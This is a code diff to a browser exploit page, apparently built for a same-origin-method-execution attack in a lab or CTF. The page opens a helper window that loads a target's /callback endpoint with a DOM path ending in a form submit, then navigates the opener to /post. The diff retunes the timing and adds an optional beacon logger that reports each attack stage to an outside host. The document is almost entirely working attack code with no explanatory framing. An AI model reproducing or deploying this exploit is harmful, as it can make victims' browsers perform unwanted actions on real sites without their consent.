@@ -10,23 +10,52 @@ const params = new URLSearchParams(window.location.search);
 const target = params.get('target') || 'http://127.0.0.1:8001';
 const callbackPath = params.get('callbackPath') ||
   'opener.document.body.firstElementChild.nextElementSibling.firstElementChild.nextElementSibling.nextElementSibling.submit';
-const navDelay = Number(params.get('navDelay') || 500);
-const callbackDelay = Number(params.get('callbackDelay') || 4000);
+const navDelay = Number(params.get('navDelay') || 300);
+const callbackDelay = Number(params.get('callbackDelay') || 6000);
+const logger = params.get('logger');
 
-const helper = window.open('', '_blank');
-if (helper) {
-  helper.document.write(`<!doctype html><script>
-    const target = ${JSON.stringify(target)};
-    const cb = ${JSON.stringify(callbackPath)};
-    const delay = ${callbackDelay};
-    setTimeout(() => {
-      location = target + '/callback?callback=' + encodeURIComponent(cb);
-    }, delay);
-  <\\/script>`);
-  helper.document.close();
+function log(stage, extra = '') {
+  if (!logger) return;
+  try {
+    navigator.sendBeacon(`${logger}?stage=${encodeURIComponent(stage)}&extra=${encodeURIComponent(extra)}`);
+  } catch (_) {
+    // ignore logging errors
+  }
 }
 
+function openHelper() {
+  try {
+    const helper = window.open('', '_blank', 'noopener=no');
+    if (!helper) {
+      log('helper_null');
+      return false;
+    }
+    helper.document.open();
+    helper.document.write(`<!doctype html><script>
+      const target = ${JSON.stringify(target)};
+      const cb = ${JSON.stringify(callbackPath)};
+      const delay = ${callbackDelay};
+      setTimeout(() => {
+        location = target + '/callback?callback=' + encodeURIComponent(cb);
+      }, delay);
+    <\\/script>`);
+    helper.document.close();
+    log('helper_opened');
+    return true;
+  } catch (err) {
+    log('helper_error', String(err));
+    return false;
+  }
+}
+
+const helperOpened = openHelper();
+
 setTimeout(() => {
+  if (!helperOpened) {
+    log('nav_skipped');
+    return;
+  }
+  log('nav_start');
   window.location = target + '/post';
 }, navDelay);
 </script>
